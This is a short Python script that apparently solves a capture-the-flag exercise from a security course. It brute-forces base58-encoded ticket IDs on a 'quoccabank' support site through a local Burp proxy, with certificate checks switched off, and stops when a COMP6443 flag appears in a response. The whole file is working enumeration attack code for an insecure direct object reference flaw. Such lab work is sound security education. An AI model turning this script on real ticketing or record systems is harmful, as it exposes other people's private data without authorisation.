import requests
import base58
import re
from urllib3.exceptions import InsecureRequestWarning

# Silences warnings about not verifying Burp's CA certificate.
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# Create a session object to save settings for the lifetime of the script.
s = requests.session()
s.verify = False  # Skip trying to verify TLS certs, due to Burp's CA.
s.proxies = {"https": "http://127.0.0.1:8080"}  # Proxy requests through Burp.

for i in range(710, 10000):
    for j in range(1, 10000000):
        ticket = str(i) + ":" + str(j)
        encoded_string = base58.b58encode(ticket.encode()).decode()
        response = s.get(f"https://support.quoccabank.com/raw/{encoded_string}")
        if re.findall(r"^.*COMP6443{.*}.*$", str(response.content)) != [] and ticket != "9447:1":
            print(response.content)
            print(ticket)
            exit()
        if re.findall(r"^.*Ticket not found.*$", str(response.content)) != []:
            print(ticket)
            break
